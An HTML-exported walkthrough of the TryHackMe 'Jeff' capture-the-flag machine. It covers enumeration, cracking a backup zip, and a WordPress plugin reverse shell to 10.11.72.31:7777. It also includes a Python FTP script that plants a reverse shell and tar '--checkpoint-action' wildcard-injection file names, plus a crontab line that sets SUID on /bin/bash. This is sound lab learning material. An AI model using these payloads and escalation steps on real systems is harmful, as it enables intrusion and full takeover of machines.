<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>jeff</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>jeff</h1><br/><p><strong><h1>THM: Jeff</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong><span style="text-decoration:underline;">Rustscan</span></strong></p><p></p><p><strong>rustscan -a 10.10.161.232</strong></p><p></p><p><img src="images/57-1.png" alt="images/57-1.png" /></p><p></p><p><strong><span style="text-decoration:underline;">Nmap</span></strong></p><p></p><p><strong>nmap -p22,80 -A 10.10.161.232</strong></p><p></p><p><img src="images/57-2.png" alt="images/57-2.png" /></p><p></p><p><strong><span style="text-decoration:underline;">Website Enumeration</span></strong></p><p></p><p>When we open the website using IP, we get a blank page.</p><p><img src="images/57-3.png" alt="images/57-3.png" /></p><p></p><p>Upon viewing its source, we found the info to add <strong>jeff.thm</strong> to our <strong>hosts</strong> file.</p><p></p><p><img src="images/57-4.png" alt="images/57-4.png" /></p><p></p><p>We add it.</p><p></p><p><strong>sudo echo &quot;10.10.161.232		jeff.thm&quot; &gt;&gt; /etc/hosts</strong></p><p></p><p>Next, we opened the website <strong> http://jeff.thm</strong></p><p></p><p><img src="images/57-5.png" alt="images/57-5.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Directory Enumeration</span></strong></p><p></p><p><strong>gobuster dir -u http://jeff.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64</strong></p><p></p><p><img src="images/57-6.png" alt="images/57-6.png" /></p><p></p><p>/uploads contains a form which doesn’t do anything</p><p>/admin gives us an empty login.php file</p><p>/source_codes gives us also an empty file</p><p>/backups directory contains a file which has actual data in it.</p><p></p><p><img src="images/57-7.png" alt="images/57-7.png" /></p><p></p><p>To find out if any files exists, we need to use gobuster &amp; a wordlist.</p><p>To find it we have to look for extensions which are often used for backups, like <strong>zip, tar, gzip</strong> etc</p><p></p><p><strong>gobuster dir -u http://jeff.thm/backups -x zip,tar,gzip -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64</strong></p><p></p><p><img src="images/57-8.png" alt="images/57-8.png" /></p><p></p><p>We got a file named “<strong>backup.zip</strong>”</p><p>To Download it we can use the URL: <strong>http://jeff.thm/backups/backup.zip</strong> </p><p></p><p>I downloaded it &amp; tried to open. It seems it is password protected.</p><p>I tried to crack it.</p><p>We can use <strong>john</strong> Or <strong>fcrackzip</strong> to crack the password.</p><p></p><p>I will use <strong>fcrackzip</strong></p><p></p><p><strong>fcrackzip -v -D -p /usr/share/wordlists/rockyou.txt backup.zip</strong></p><p></p><p><img src="images/57-9.png" alt="images/57-9.png" /></p><p></p><p><strong><span style="text-decoration:underline;">Zip File Enumeration</span></strong></p><p></p><p>I unzipped the file with the found password &amp; checked its contents.</p><p></p><p><img src="images/57-10.png" alt="images/57-10.png" /></p><p></p><p>we found the wordpress password in the <strong>wpadmin.bak</strong> file</p><p></p><p><img src="images/57-11.png" alt="images/57-11.png" /></p><p></p><p>Seeing this backup directory, we guess that maybe jeff has already setup his wordpress CMS. I decided to enumerate subdomains using gobuster.</p><p></p><p><strong><span style="text-decoration:underline;">Subdomain Enumeration</span></strong></p><p></p><p><strong>gobuster vhost -u http://jeff.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64</strong></p><p></p><p><img src="images/57-12.png" alt="images/57-12.png" /></p><p></p><p>We found a subdomain <strong>wordpress.jeff.thm</strong> </p><p>I removed the old entry &amp; added this to /etc/hosts</p><p></p><p><strong>sudo echo “10.10.161.232		jeff.thm	wordpress.jeff.thm” &gt;&gt; /etc/hosts</strong></p><p></p><p><strong><span style="text-decoration:underline;">Wordpress Site Enumeration</span></strong></p><p></p><p>URL: <strong>http://wordpress.jeff.thm</strong> </p><p></p><p><img src="images/57-13.png" alt="images/57-13.png" /></p><p></p><p>Next, we Login into wordpress by going to the link:<strong> http://wordpress.jeff.thm/wp-login.php</strong></p><p></p><p><img src="images/57-14.png" alt="images/57-14.png" /></p><p></p><p>We can login using Username as <strong>jeff</strong> &amp; password as the one we found in the backup file.</p><p></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p><img src="images/57-15.png" alt="images/57-15.png" /></p><p></p><p>Most of the time we can manipulate <strong>theme</strong> templates like the <strong>404.php-page</strong> to get a reverse shell with wordpress, but this isn’t possible in this case. (<strong>It did not work</strong>)</p><p>So we’ll use a <strong>plugin</strong> which isn’t activated yet and supports php.</p><p>In our case this will be <strong>Hello Dolly.</strong></p><p></p><p><img src="images/57-16.png" alt="images/57-16.png" /></p><p></p><p>Go to &quot;<strong>Plugin Editor</strong>&quot; select the <strong>Hello Dolly</strong> at right top &amp; then append the reverse shell at the end.</p><p></p><p><strong>exec(&quot;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.11.72.31/7777 0&gt;&amp;1&#39;&quot;);</strong></p><p></p><p><img src="images/57-17.png" alt="images/57-17.png" /></p><p></p><p>Next, we click on <strong>Update File</strong></p><p>Start a Netcat Listner.</p><p></p><p><strong>nc -lvnp 7777</strong></p><p></p><p>Next, we activate the plugins.</p><p><img src="images/57-18.png" alt="images/57-18.png" /></p><p></p><p></p><p>We check the listner.</p><p><img src="images/57-19.png" alt="images/57-19.png" /></p><p></p><p>Foothold was successful.</p><p></p><p><strong><h2>Lateral Movement &amp; Privilege Escalation</h2></strong></p><p></p><p>We checked that we are inside a container.</p><p><strong>.dockerenv </strong>file present in <strong>/</strong> directory</p><p></p><p>Next, I checked the <strong>/var/www/html</strong> directory &amp; found an intresting file <strong>ftp_backup.php</strong></p><p></p><p><img src="images/57-20.png" alt="images/57-20.png" /></p><p></p><p>The file has FTP credentials &amp; an indication that FTP is only accessible to internal Network.</p><p>Here, we can do <strong>Port Forwarding</strong>, but I will do this with a <strong>python script</strong>.</p><p></p><p><strong>Python Script</strong></p><p>#############################</p><p>from ftplib import FTP</p><p>import io</p><p></p><p>with FTP(host=&#39;172.20.0.1&#39;) as ftp:</p><p>	print(str(ftp.getwelcome()))</p><p>	try:</p><p>		ftp.login(user=&#39;<strong>backupmgr</strong>&#39;, passwd=&#39;<strong>&lt;password&gt;</strong>&#39;)</p><p>		print(&quot;[+] Login successful!&quot;)</p><p>		ftp.set_pasv(False)</p><p>		print(&quot;[+] Mode set to \&quot;active\&quot;&quot;)</p><p>		print(&quot;[*] Working directory: &quot; + str(ftp.pwd()))</p><p>		print(&quot;[*] Listing directory&quot;)</p><p>		ftp.dir()</p><p>		print(&quot;[*] Trying to change into the  \&quot;files\&quot; directory.&quot;)</p><p>		ftp.cwd(&#39;files&#39;)</p><p>		print(&quot;[+] Successfully changed directory!&quot;)</p><p>		</p><p>		# Want to Delete files in this directory?</p><p>		#ftp.delete(&#39;&#39;)</p><p>		#print(&quot;[+] Deleted the files.&quot;)</p><p>		</p><p>		# Now we want to create the payloads and upload everything!</p><p>		print(&quot;[*] Trying to create the files!&quot;)</p><p>		shell = io.BytesIO(b&#39;python3 -c \&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<strong>[your IP]</strong>&quot;,<strong>[PORT]</strong>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\&#39;&#39;)</p><p>		emptyFile = io.BytesIO(b&#39;&#39;)</p><p>                ftp.storlines(&#39;STOR shell.sh&#39;, shell)</p><p>		ftp.storlines(&#39;STOR --checkpoint=1&#39;, emptyFile)</p><p>		ftp.storlines(&#39;STOR --checkpoint-action=exec=sh shell.sh&#39;, emptyFile)</p><p>		print(&quot;[+] Success!&quot;)</p><p>		</p><p></p><p>		print(&quot;[*] These files are now in the directory \&quot;&quot; + str(ftp.pwd()) + &quot;\&quot;&quot;)</p><p>		ftp.dir()</p><p></p><p>		# Want to check if the payload is correct?</p><p>		#print(&quot;Payload:\n&quot;)</p><p>		#print(str(ftp.retrlines(&quot;RETR shell.sh&quot;)))</p><p></p><p>		print(&quot;[+] Closing FTP connection&quot;)</p><p>		ftp.quit()</p><p>		</p><p></p><p>	except Exception as e:</p><p>		print(&#39;FTP error: &#39;, e)</p><p>#############################</p><p></p><p><strong>Explanation</strong></p><p></p><p>    ▸ We are creating a connection to the server and login with the username and password we found in the ftp_backup.php file</p><p>    ▸ It’s important to set ftp.set_pasv(False), because this results in using the ftp active mode. If we don’t do this the default value is taken, which is passive mode and this doesn’t work on this machine.</p><p>    ▸ ftp.dir() shows that there is only one directory: /files in which we change in the next step</p><p>    ▸ io.BytesIO() is used to create our files, one is an empty dummy and one contains our reverse shell</p><p>    ▸ We are using a python reverse shell. It’s important to use python3 and not python3.7! I did this at first and haven’t gotten a shell back.</p><p>    ▸ The most important part is --checkpoint=1 and --checkpoint-action=exec=sh shell.sh</p><p></p><p>Why does this work? Whats happening outside the container? A crontab is running outside the container! The user backupmgr is running tar every few minutes and uses a <strong>wildcard *</strong> to include everything in the ftp://files directory.</p><p>In this case the usage of wildcard is dangerous and makes this exploit possible, because our files --checkpoint=1 and --checkpoint-action=exec=sh shell.sh are interpreted as arguments of the tar command!</p><p>This means that after 1 proccessed file the checkpoint is reached. The checkpoints action is sh shell.sh which then invokes our python3 payload and we can catch the reverse shell with nc.</p><p></p><p>Make Necessary Changes to the Python Code(Password, IP, Port), Then copy the code into the system &amp; Start Netcat Listener.</p><p>Finally, run the Python Script.</p><p></p><p><img src="images/57-21.png" alt="images/57-21.png" /></p><p></p><p>Next, we check that a user named jeff exists. Lets find all files belonging to him.</p><p></p><p><strong>find / -user jeff 2&gt;/dev/null</strong></p><p></p><p></p><p><img src="images/57-22.png" alt="images/57-22.png" /></p><p></p><p>I see that, if we need to  be <strong>jeff</strong> or <strong>pwman</strong> to read the file</p><p></p><p><img src="images/57-23.png" alt="images/57-23.png" /></p><p></p><p>We see that the program <strong>systool</strong> has GUID set. (ie. It would be run as group <strong>pwman</strong>)</p><p>We need to find a way to exploit this.</p><p></p><p><img src="images/57-24.png" alt="images/57-24.png" /></p><p></p><p>The tool has above options.</p><p>When run with <strong>ltrace</strong> &amp; select option <strong>2</strong>, we see a file named <strong>message.txt</strong> is read</p><p></p><p><img src="images/57-25.png" alt="images/57-25.png" /></p><p></p><p>Luckily, the file has permissions.</p><p></p><p><img src="images/57-26.png" alt="images/57-26.png" /></p><p></p><p>Let’s rename, delete or move the existing <strong>message.txt</strong> and replace it with a symbolic link to <strong>/var/backups/jeff.bak</strong></p><p></p><p><strong>ln -s /var/backups/jeff.bak message.txt</strong></p><p></p><p>Then run the program &amp; select 2</p><p>It will read this file.</p><p></p><p><img src="images/57-27.png" alt="images/57-27.png" /></p><p></p><p>We got Jeff&#39;s Password.</p><p>If we normally do <strong>su</strong> into<strong> jeff</strong> we get a <strong>rbash</strong> (Restricted Bash)</p><p></p><p><strong>Use the following to Break out of (rbash)Restricted Bash</strong>:</p><p></p><p><strong>su -l jeff -c &quot;/bin/bash -i&quot;</strong></p><p></p><p>This will still <strong>PATH</strong> not properly set.</p><p></p><p>Example: We need to use <strong>/bin/cat</strong> For <strong>cat</strong></p><p><strong>Note:</strong> We can run a python shell &amp; have unrestricted access.</p><p></p><p>Or</p><p></p><p>Use <strong>SSH</strong> to get full bash access as follows:</p><p></p><p><strong>ssh jeff@10.10.1.126 -t bash &#39;--noprofile&#39;</strong></p><p><strong></strong></p><p>Get the user flag in <strong>jeff&#39;s</strong> home directory.</p><p></p><p><img src="images/57-28.png" alt="images/57-28.png" /></p><p></p><p></p><p>As we have crontab in sudo, we can easily get into root.</p><p></p><p>We will edit the crontab by</p><p></p><p><strong>sudo /usr/bin/crontab -e</strong></p><p></p><p>&amp; add the following line.</p><p></p><p><strong>* * * * * chmod u+s /bin/bash</strong></p><p></p><p>After a minute, we will have a <strong>bash</strong> executible with <strong>SUID</strong> set</p><p></p><p><img src="images/57-29.png" alt="images/57-29.png" /></p><p></p><p>Thus, we have root access. We get the root flag in /root directory.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
